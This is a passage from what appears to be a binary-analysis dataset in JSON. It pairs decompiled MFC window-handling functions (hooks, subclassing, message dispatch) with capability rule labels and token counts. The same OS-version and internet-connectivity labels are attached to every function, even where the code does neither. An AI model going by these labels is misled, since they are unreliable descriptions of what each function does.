        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.0041ddff(int32_t arg_8h, uint arg_ch, int32_t *arg_10h)\n\n{\n    int32_t *piVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    int32_t iVar6;\n    int32_t *piVar7;\n    int32_t iVar8;\n    code *pcVar9;\n    uint32_t var_10h;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = fcn.00424808(0x423997);\n    if (arg_8h != 3) {\n        uVar2 = (*_sym.imp.USER32.dll_CallNextHookEx)(*(var_4h + 0x2c), arg_8h, arg_ch, arg_10h);\n        return uVar2;\n    }\n    piVar1 = *(var_4h + 0x14);\n    iVar6 = *arg_10h;\n    iVar3 = fcn.00423ff7();\n    var_8h = *(iVar3 + 0x14);\n    if ((piVar1 == NULL) && (((*(iVar6 + 0x23) & 0x40) != 0 || (var_8h != 0)))) goto code_r0x0041dfc8;\n    if (*0x44d76c != 0) {\n        uVar4 = (*_sym.imp.USER32.dll_GetClassLongA)(arg_ch, 0xffffffe6);\n        if ((uVar4 & 0x10000) != 0) goto code_r0x0041dfc8;\n        puVar5 = *(iVar6 + 0x28);\n        if (puVar5 >> 0x10 == 0) {\n            var_10h = var_10h & 0xffffff00 | var_10h & puVar5 >> 0x10;\n            (*_sym.imp.KERNEL32.dll_GlobalGetAtomNameA)(&var_10h & 0xffff0000 | *(iVar6 + 0x28), &var_10h, 5);\n            puVar5 = &var_10h;\n        }\n        iVar6 = (*_sym.imp.KERNEL32.dll_lstrcmpiA)(puVar5, 0x42a578);\n        if (iVar6 == 0) goto code_r0x0041dfc8;\n    }\n    if (piVar1 == NULL) {\n        iVar6 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n        pcVar9 = _sym.imp.USER32.dll_GetPropA;\n        if ((iVar6 != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetPropA)(arg_ch, \"AfxOldWndProc423\"),  iVar3 == 0)) {\n            (*_sym.imp.USER32.dll_SetPropA)(arg_ch, \"AfxOldWndProc423\", iVar6);\n            iVar3 = (*pcVar9)(arg_ch, \"AfxOldWndProc423\");\n            if (iVar3 == iVar6) {\n                (*_sym.imp.KERNEL32.dll_GlobalAddAtomA)(\"AfxOldWndProc423\");\n                pcVar9 = fcn.0041dd83;\n                if (*(var_4h + 0x28) == 0) {\n                    pcVar9 = fcn.0041dc24;\n                }\n                (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, pcVar9);\n            }\n        }\n        goto code_r0x0041dfc8;\n    }\n    fcn.0041db87(arg_ch);\n    (**(*piVar1 + 0x50))();\n    piVar7 = (**(*piVar1 + 0x80))();\n    iVar6 = *0x44d768;\n    if ((((*0x44d754 == 0) && (var_8h == 0)) && (*0x44d768 != 0)) &&\n       ((*(*0x44d768 + 0x20) != 0 && (var_10h = fcn.0041d981(piVar1, arg_ch, 0x36f, 0, 0),  var_10h != 0)))) {\n        iVar3 = fcn.0041dc1e();\n        iVar8 = (*_sym.imp.USER32.dll_GetWindowLongA)(arg_ch, 0xfffffffc);\n        (**(iVar6 + 0x20))(arg_ch, var_10h);\n        if (iVar8 != iVar3) {\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, iVar3);\ncode_r0x0041df5c:\n            *piVar7 = iVar3;\n        }\n    }\n    else {\n        iVar6 = fcn.0041dc1e();\n        iVar3 = (*_sym.imp.USER32.dll_SetWindowLongA)(arg_ch, 0xfffffffc, iVar6);\n        if (iVar3 != iVar6) goto code_r0x0041df5c;\n    }\n    *(var_4h + 0x14) = 0;\ncode_r0x0041dfc8:\n    iVar6 = var_4h;\n    uVar2 = (*_sym.imp.USER32.dll_CallNextHookEx)(*(var_4h + 0x2c), 3, arg_ch, arg_10h);\n    if (var_8h != 0) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar6 + 0x2c));\n        *(iVar6 + 0x2c) = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 1279
    },
    "0041dff5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041dff5(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t unaff_retaddr;\n    \n    iVar1 = fcn.00424808(0x423997);\n    if (*(iVar1 + 0x14) != unaff_retaddr) {\n        if (*(iVar1 + 0x2c) == 0) {\n            uVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            iVar3 = (*_sym.imp.USER32.dll_SetWindowsHookExA)(5, fcn.0041ddff, 0, uVar2);\n            *(iVar1 + 0x2c) = iVar3;\n            if (iVar3 == 0) {\n                fcn.0041b368();\n            }\n        }\n        *(iVar1 + 0x14) = unaff_retaddr;\n    }\n    return;\n}\n",
        "token_count": 204
    },
    "0041e041": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041e041(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00424808(0x423997);\n    iVar2 = fcn.00423ff7();\n    if ((*(iVar2 + 0x14) != '\\0') && (*(iVar1 + 0x2c) != 0)) {\n        (*_sym.imp.USER32.dll_UnhookWindowsHookEx)(*(iVar1 + 0x2c));\n        *(iVar1 + 0x2c) = 0;\n    }\n    if (*(iVar1 + 0x14) != 0) {\n        *(iVar1 + 0x14) = 0;\n        return 0;\n    }\n    return 1;\n}\n",
        "token_count": 171
    },
    "0041e1b5": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.0041e1b5(void)\n\n{\n    code *pcVar1;\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CWnd.0;\n    *(unaff_EBP + -4) = 0;\n    if ((((extraout_ECX[7] != NULL) && (extraout_ECX != 0x44d168)) && (extraout_ECX != 0x44d128)) &&\n       ((extraout_ECX != 0x44d0e8 && (extraout_ECX != 0x44d0a8)))) {\n        fcn.0041e372();\n    }\n    if (extraout_ECX[0xd] != NULL) {\n        (**(*extraout_ECX[0xd] + 4))(1);\n    }\n    pcVar1 = extraout_ECX[0xe];\n    if ((pcVar1 != NULL) && (*(pcVar1 + 0x24) == extraout_ECX)) {\n        *(pcVar1 + 0x24) = 0;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041c304();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 358
    },
    "0041e24f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041e24f(int32_t *param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    uint var_2ch;\n    uint var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    \n    iVar2 = fcn.0041bd38();\n    if (iVar2 == 0) goto code_r0x0041e29a;\n    if (*(iVar2 + 0x1c) == param_1) {\n        iVar3 = fcn.00423ff7();\n        if (*(iVar3 + 0x14) == '\\0') {\n            iVar3 = fcn.00423ff7();\n            if (iVar2 == *(iVar3 + 4)) {\n                iVar3 = fcn.004233dc();\n                if (iVar3 == 0) goto code_r0x0041e28f;\n            }\n            fcn.00427988(0);\n        }\ncode_r0x0041e28f:\n        *(iVar2 + 0x1c) = 0;\n    }\n    if (*(iVar2 + 0x20) == param_1) {\n        *(iVar2 + 0x20) = 0;\n    }\ncode_r0x0041e29a:\n    if (param_1[0xc] != NULL) {\n        (**(*param_1[0xc] + 0x50))();\n        param_1[0xc] = 0;\n    }\n    if (param_1[0xd] != NULL) {\n        (**(*param_1[0xd] + 4))(1);\n    }\n    param_1[0xd] = 0;\n    if ((*(param_1 + 9) & 1) != 0) {\n        iVar2 = fcn.00423dca();\n        iVar2 = *(iVar2 + 0xcc);\n        if ((iVar2 != 0) && (*(iVar2 + 0x1c) != 0)) {\n            fcn.0040b990(&var_2ch, 0, 0x2c);\n            var_24h = param_1[7];\n            var_2ch = 0x28;\n            var_28h = 1;\n            var_20h = var_24h;\n            (*_sym.imp.USER32.dll_SendMessageA)(*(iVar2 + 0x1c), 0x405, 0, &var_2ch);\n        }\n    }\n    pcVar1 = _sym.imp.USER32.dll_GetWindowLongA;\n    iVar2 = (*_sym.imp.USER32.dll_GetWindowLongA)(param_1[7], 0xfffffffc);\n    fcn.0041daa9();\n    iVar3 = (*pcVar1)(param_1[7], 0xfffffffc);\n    if (iVar3 == iVar2) {\n        piVar4 = (**(*param_1 + 0x80))();\n        if (*piVar4 != 0) {\n            (*_sym.imp.USER32.dll_SetWindowLongA)(param_1[7], 0xfffffffc, *piVar4);\n        }\n    }\n    fcn.0041dbc0();\n    (**(*param_1 + 0xa4))();\n    return;\n}\n",
        "token_count": 737
    },
    "0041e372": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041e372(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 0x1c) == 0) {\n        return 0;\n    }\n    fcn.0041dad0(0);\n    iVar1 = fcn.0041b9a4(*(param_1 + 0x1c));\n    if (*(param_1 + 0x38) == NULL) {\n        uVar2 = (*_sym.imp.USER32.dll_DestroyWindow)(*(param_1 + 0x1c));\n    }\n    else {\n        uVar2 = (**(**(param_1 + 0x38) + 0x50))();\n    }\n    if (iVar1 == 0) {\n        fcn.0041dbc0();\n    }\n    return uVar2;\n}\n",
        "token_count": 194
    },
    "0041e9b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __cdecl fcn.0041e9b9(int32_t *arg_8h, int32_t arg_ch, int32_t arg_10h, uint32_t arg_14h)\n\n{\n    while( true ) {\n        if (arg_8h[4] == 0) {\n            return NULL;\n        }\n        if ((((arg_ch == *arg_8h) && (arg_10h == arg_8h[1])) && (arg_8h[2] <= arg_14h)) &&\n           (arg_14h < arg_8h[3] || arg_14h == arg_8h[3])) break;\n        arg_8h = arg_8h + 6;\n    }\n    return arg_8h;\n}\n",
        "token_count": 170
    },
    "0041ea3d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING (jumptable): Unable to track spacebase fully for stack\n// WARNING: Variable defined which should be unmapped: var_60h\n\nuint __cdecl fcn.0041ea3d(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint uVar1;\n    uint8_t uVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    int32_t *arg_8h_00;\n    uint *puVar7;\n    uint *puVar8;\n    uint32_t uVar9;\n    code *pcVar10;\n    int32_t unaff_EBP;\n    int16_t iVar11;\n    uint *in_FS_OFFSET;\n    uint uVar12;\n    uint var_60h;\n    uint var_44h;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.0040b7d8();\n    *(unaff_EBP + -0x10) = 0;\n    iVar4 = *(unaff_EBP + 8);\n    if (iVar4 == 0x111) {\n        iVar4 = (**(*arg_8h_00 + 0x78))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n        if (iVar4 != 0) {\ncode_r0x0041ee93:\n            *(unaff_EBP + -0x10) = 1;\n            goto code_r0x0041eed7;\n        }\ncode_r0x0041ebc6:\n        uVar12 = 0;\n        goto code_r0x0041ebc8;\n    }\n    if (iVar4 == 0x4e) {\n        if (**(unaff_EBP + 0x10) != 0) {\n            iVar4 = (**(*arg_8h_00 + 0x7c))(*(unaff_EBP + 0xc), *(unaff_EBP + 0x10), unaff_EBP + -0x10);\ncode_r0x0041ea96:\n            if (iVar4 != 0) goto code_r0x0041eed7;\n        }\n        goto code_r0x0041ebc6;\n    }\n    puVar7 = *(unaff_EBP + 0x10);\n    if (iVar4 == 6) {\n        uVar12 = fcn.0041db42(puVar7);\n        fcn.0041d8aa(arg_8h_00, *(unaff_EBP + 0xc), uVar12);\n    }\n    iVar11 = puVar7;\n    if ((iVar4 == 0x20) && (iVar4 = fcn.0041d90b(arg_8h_00, iVar11, puVar7 >> 0x10),  iVar4 != 0))\n    goto code_r0x0041ee93;\n    uVar5 = (**(*arg_8h_00 + 0x28))();\n    *(unaff_EBP + -0x14) = uVar5;\n    uVar9 = uVar5 & 0x1ff ^ *(unaff_EBP + 8) & 0x1ff;\n    fcn.00424b3c(7);\n    uVar5 = *(unaff_EBP + 8);\n    iVar4 = uVar9 * 0xc;\n    iVar6 = *(unaff_EBP + -0x14);\n    if ((uVar5 != *(uVar9 * 0xc + 0x44b880)) || (iVar6 != *(iVar4 + 0x44b888))) {\n        *(iVar4 + 0x44b880) = uVar5;\n        *(iVar4 + 0x44b888) = iVar6;\n        if (iVar6 != 0) {\n            while( true ) {\n                if (uVar5 < 0xc000) {\n                    iVar6 = fcn.0041e9b9(*(iVar6 + 4), uVar5, 0, 0);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 != 0) {\n                        *(iVar4 + 0x44b884) = iVar6;\n                        fcn.00424bac(7);\n                        iVar4 = *(unaff_EBP + 0x10);\n                        goto code_r0x0041ebe6;\n                    }\n                }\n                else {\n                    iVar6 = fcn.0041e9b9(*(iVar6 + 4), 0xc000, 0, 0);\n                    *(unaff_EBP + 0x10) = iVar6;\n                    if (iVar6 != 0) {\n                        while( true ) {\n                            if (**(iVar6 + 0x10) == *(unaff_EBP + 8)) {\n                                *(iVar4 + 0x44b884) = iVar6;\n                                fcn.00424bac(7);\n                                iVar4 = *(unaff_EBP + 0x10);\n                                goto code_r0x0041eec9;\n                            }\n                            iVar6 = fcn.0041e9b9(iVar6 + 0x18, 0xc000, 0, 0);\n                            *(unaff_EBP + 0x10) = iVar6;\n                            if (iVar6 == 0) break;\n                            iVar6 = *(unaff_EBP + 0x10);\n                        }\n                    }\n                }\n                iVar6 = **(unaff_EBP + -0x14);\n                *(unaff_EBP + -0x14) = iVar6;\n                if (iVar6 == 0) break;\n                iVar6 = *(unaff_EBP + -0x14);\n                uVar5 = *(unaff_EBP + 8);\n            }\n        }\n        *(iVar4 + 0x44b884) = 0;\n        fcn.00424bac(7);\n        goto code_r0x0041ebc6;\n    }\n    iVar4 = *(iVar4 + 0x44b884);\n    *(unaff_EBP + 0x10) = iVar4;\n    fcn.00424bac(7);\n    if (iVar4 == 0) goto code_r0x0041ebc6;\n    if (0xbfff < *(unaff_EBP + 8)) {\ncode_r0x0041eec9:\n        pcVar10 = *(iVar4 + 0x14);\ncode_r0x0041eecc:\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0041eed0;\n    }\ncode_r0x0041ebe6:\n    iVar6 = *(unaff_EBP + 0x10);\n    pcVar10 = *(iVar4 + 0x14);\n    iVar4 = *(iVar6 + 0x10);\n    if (*(iVar6 + 8) == 0x1a) {\n        uVar2 = (*_sym.imp.KERNEL32.dll_GetVersion)();\n        iVar6 = *(unaff_EBP + 0x10);\n        iVar4 = (-(uVar2 < 4) & 0xfffffff0) + 0x2f;\n    }\n    iVar3 = puVar7 >> 0x10;\n    // switch table (49 cases) at 0x41eeeb\n    switch(iVar4) {\n    case 1:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.00421c4e(puVar7);\n        goto code_r0x0041ed21;\n    case 2:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0041ed21;\n    case 3:\n    case 8:\n        uVar9 = puVar7 >> 0x10;\n        puVar7 = iVar11;\n        uVar5 = *(unaff_EBP + 0xc);\n        uVar9 = fcn.0041db42(uVar5, puVar7, uVar9);\n        goto code_r0x0041ed3c;\n    case 4:\n        fcn.00421bac();\n        uVar12 = puVar7[1];\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x20) = uVar12;\n        fcn.0041d721();\n        uVar12 = *puVar7;\n        uVar1 = puVar7[2];\n        *(unaff_EBP + -4) = 1;\n        *(unaff_EBP + -0x44) = uVar12;\n        iVar4 = fcn.0041db69(uVar12);\n        if (iVar4 == 0) {\n            if ((arg_8h_00[0xd] != 0) && (iVar4 = fcn.0041b9a4(*(unaff_EBP + -0x44)),  iVar4 != 0)) {\n                *(unaff_EBP + -0x28) = iVar4;\n            }\n            iVar4 = unaff_EBP + -0x60;\n        }\n        uVar12 = (*pcVar10)(unaff_EBP + -0x24, iVar4, uVar1);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -0x44) = 0;\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x10) = uVar12;\n        fcn.0041e1b5();\n        *(unaff_EBP + -4) = 0xffffffff;\n        goto code_r0x0041ecf7;\n    case 5:\n        fcn.00421bac();\n        uVar12 = puVar7[2];\n        *(unaff_EBP + -0x20) = puVar7[1];\n        *(unaff_EBP + -4) = 2;\n        uVar12 = (*pcVar10)(unaff_EBP + -0x24, uVar12);\n        *(unaff_EBP + -0x20) = 0;\n        *(unaff_EBP + -4) = 0xffffffff;\n        *(unaff_EBP + -0x10) = uVar12;\ncode_r0x0041ecf7:\n        fcn.00421ccb();\n        break;\n    case 6:\n        uVar5 = fcn.0041db42(puVar7, *(unaff_EBP + 0xc) >> 0x10);\n        goto code_r0x0041ed37;\n    case 7:\n        puVar7 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar5 = *(unaff_EBP + 0xc);\n        goto code_r0x0041eed0;\n    case 9:\n    case 0x2a:\ncode_r0x0041ed21:\n        uVar12 = (*pcVar10)(puVar7);\ncode_r0x0041eed4:\n        *(unaff_EBP + -0x10) = uVar12;\n        break;\n    case 10:\n    case 0x21:\n        goto code_r0x0041eecc;\n    case 0xb:\n        puVar7 = fcn.004206cb(puVar7);\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\ncode_r0x0041ed37:\n        uVar9 = *(unaff_EBP + 0xc);\ncode_r0x0041ed3c:\n        uVar12 = (*pcVar10)(uVar9, uVar5, puVar7);\n        goto code_r0x0041eed4;\n    case 0xc:\n        (*pcVar10)();\n        break;\n    case 0xd:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0041ee60;\n    case 0xe:\n    case 0x12:\n    case 0x25:\n    case 0x2f:\n        goto code_r0x0041ee40;\n    case 0xf:\n        puVar8 = iVar3;\n        iVar4 = iVar11;\n        goto code_r0x0041ee43;\n    case 0x10:\n    case 0x11:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        goto code_r0x0041ee81;\n    case 0x13:\n        puVar8 = *(unaff_EBP + 0xc);\n        uVar5 = fcn.0041db42(puVar8);\n        fcn.0041db42(puVar7, uVar5);\n        uVar9 = arg_8h_00[7] == puVar7;\n        goto code_r0x0041ee85;\n    case 0x14:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.00421c4e(puVar7);\n        goto code_r0x0041ee60;\n    case 0x15:\n        puVar7 = *(unaff_EBP + 0xc);\n        fcn.004206cb(puVar7);\n        goto code_r0x0041ee60;\n    case 0x16:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        uVar9 = fcn.004206cb(*(unaff_EBP + 0xc), uVar5, puVar8);\n        goto code_r0x0041ee85;\n    case 0x17:\n        puVar7 = *(unaff_EBP + 0xc);\n        goto code_r0x0041edc7;\n    case 0x18:\n        puVar8 = puVar7 >> 0x10;\n        uVar5 = puVar7 & 0xffff;\n        goto code_r0x0041ede3;\n    case 0x19:\n        uVar5 = iVar11;\n        puVar8 = iVar3;\ncode_r0x0041ede3:\n        uVar9 = fcn.0041db42(*(unaff_EBP + 0xc), uVar5, puVar8);\n        goto code_r0x0041ee85;\n    case 0x1a:\n        iVar4 = fcn.0041db42(*(unaff_EBP + 0xc), puVar7);\n        puVar8 = puVar7;\n        goto code_r0x0041ee43;\n    case 0x1b:\n        fcn.0041db42(puVar7);\ncode_r0x0041ee40:\n        iVar4 = *(unaff_EBP + 0xc);\n        puVar8 = puVar7;\n        goto code_r0x0041ee43;\n    case 0x1c:\n        puVar8 = *(unaff_EBP + 0xc) >> 0x10;\n        uVar5 = fcn.0041db42(puVar7, puVar8);\n        goto code_r0x0041ee6d;\n    case 0x1d:\n    case 0x1e:\n        iVar4 = *(unaff_EBP + 0xc);\n        iVar6 = *(iVar6 + 0x10);\n        *(unaff_EBP + 8) = iVar4;\n        puVar8 = *(unaff_EBP + 0xc) >> 0x10;\n        *(unaff_EBP + 0xc) = puVar8;\n        if (iVar6 == 0x1d) {\n            uVar5 = fcn.0041db42(puVar7);\n            uVar9 = *(unaff_EBP + 0xc);\n            puVar8 = puVar7;\n            goto code_r0x0041ee85;\n        }\ncode_r0x0041ee43:\n        (*pcVar10)(iVar4, puVar8);\n        break;\n    case 0x1f:\n    case 0x24:\n        goto code_r0x0041ee60;\n    case 0x20:\n    case 0x2b:\n        (*pcVar10)(*(unaff_EBP + 0xc), puVar7);\n        goto code_r0x0041ee93;\n    case 0x22:\n        uVar5 = iVar11;\n        puVar7 = iVar3;\n        goto code_r0x0041eed0;\n    case 0x23:\n        uVar12 = (*pcVar10)();\n        goto code_r0x0041eed4;\n    case 0x2c:\ncode_r0x0041edc7:\n        fcn.0041db42(puVar7);\ncode_r0x0041ee60:\n        (*pcVar10)(puVar7);\n        break;\n    case 0x2d:\n        uVar5 = fcn.0041db42(*(unaff_EBP + 0xc), puVar7);\ncode_r0x0041eed0:\n        uVar12 = (*pcVar10)(uVar5, puVar7);\n        goto code_r0x0041eed4;\n    case 0x2e:\n        iVar4 = (*pcVar10)(*(unaff_EBP + 0xc), *(unaff_EBP + 0xc) >> 0x10, puVar7 & 0xffff, puVar7 >> 0x10);\n        *(unaff_EBP + -0x10) = iVar4;\n        goto code_r0x0041ea96;\n    case 0x30:\n        uVar5 = *(unaff_EBP + 0xc) >> 0x10;\n        puVar8 = puVar7;\ncode_r0x0041ee6d:\n        uVar9 = *(unaff_EBP + 0xc);\n        goto code_r0x0041ee85;\n    case 0x31:\n        uVar5 = iVar11;\n        puVar8 = iVar3;\ncode_r0x0041ee81:\n        uVar9 = *(unaff_EBP + 0xc);\ncode_r0x0041ee85:\n        (*pcVar10)(uVar9, uVar5, puVar8);\n    }\ncode_r0x0041eed7:\n    if (*(unaff_EBP + 0x14) != NULL) {\n        **(unaff_EBP + 0x14) = *(unaff_EBP + -0x10);\n    }\n    uVar12 = 1;\ncode_r0x0041ebc8:\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return uVar12;\n}\n",
        "token_count": 4151
    },
    "0041f18a": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.0041f18a(int32_t *param_1)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    \n    if ((param_1 != NULL) && (param_1[7] != 0)) {\n        iVar2 = (**(*param_1 + 0xb0))();\n        piVar3 = param_1;\n        if (iVar2 == 0) {\n            param_1 = fcn.0041f0df();\n            piVar3 = param_1;\n        }\n        while (piVar1 = piVar3,  piVar1 != NULL) {\n            piVar3 = fcn.0041f0df();\n            param_1 = piVar1;\n        }\n        return param_1;\n    }\n    return NULL;\n}\n",
        "token_count": 189
    },
    "0041f244": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041f244(uint arg_8h, uint Msg, uint wParam, uint lParam, int32_t arg_18h, int32_t arg_1ch)\n\n{\n    code *pcVar1;\n    int32_t arg_8h_00;\n    int32_t iVar2;\n    \n    pcVar1 = _sym.imp.USER32.dll_GetTopWindow;\n    for (arg_8h_00 = (*_sym.imp.USER32.dll_GetTopWindow)(arg_8h); arg_8h_00 != 0;\n        arg_8h_00 = (*_sym.imp.USER32.dll_GetWindow)(arg_8h_00, 2)) {\n        if (arg_1ch == 0) {\n            (*_sym.imp.USER32.dll_SendMessageA)(arg_8h_00, Msg, wParam, lParam);\n        }\n        else {\n            iVar2 = fcn.0041db69(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041d981(iVar2, *(iVar2 + 0x1c), Msg, wParam, lParam);\n            }\n        }\n        if (arg_18h != 0) {\n            iVar2 = (*pcVar1)(arg_8h_00);\n            if (iVar2 != 0) {\n                fcn.0041f244(arg_8h_00, Msg, wParam, lParam, arg_18h, arg_1ch);\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 330
    },
    "0041f87d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041f87d(int32_t hdc, uint arg_ch, int32_t arg_10h, int32_t hgdiobj, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint lpvObject;\n    uint crColor;\n    \n    if ((((hdc == 0) || (hgdiobj == 0)) || (arg_10h == 1)) || ((arg_10h == 0 || (arg_10h == 5)))) {\ncode_r0x0041f8ec:\n        uVar2 = 0;\n    }\n    else {\n        if (arg_10h == 2) {\n            iVar1 = fcn.0042245f(arg_ch, 2);\n            if (iVar1 == 0) goto code_r0x0041f8ec;\n        }\n        (*_sym.imp.GDI32.dll_GetObjectA)(hgdiobj, 0xc, &lpvObject);\n        (*_sym.imp.GDI32.dll_SetBkColor)(hdc, crColor);\n        if (arg_18h == -1) {\n            arg_18h = (*_sym.imp.USER32.dll_GetSysColor)(8);\n        }\n        (*_sym.imp.GDI32.dll_SetTextColor)(hdc, arg_18h);\n        uVar2 = 1;\n    }\n    return uVar2;\n}\n",
        "token_count": 308
    },
    "0041fbb7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0041fbb7(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int16_t iVar3;\n    int32_t iVar4;\n    int32_t in_ECX;\n    uint *puVar5;\n    uint *puVar6;\n    uint var_28h;\n    uint var_24h;\n    uint *var_20h;\n    int32_t var_4h;\n    \n    pcVar2 = _sym.imp.USER32.dll_SendDlgItemMessageA;\n    var_4h = 1;\n    if (arg_8h != NULL) {\n        do {\n            if (*arg_8h == 0) break;\n            iVar3 = arg_8h[1];\n            iVar1 = *(arg_8h + 2);\n            puVar5 = arg_8h + 4;\n            if (iVar3 == 0x1234) {\ncode_r0x0041fc19:\n                var_24h = 0xffffffff;\n                var_28h = 1;\n                iVar3 = 0x401;\n                puVar6 = &var_28h;\n                var_20h = puVar5;\ncode_r0x0041fc47:\n                iVar4 = (*pcVar2)(*(in_ECX + 0x1c), 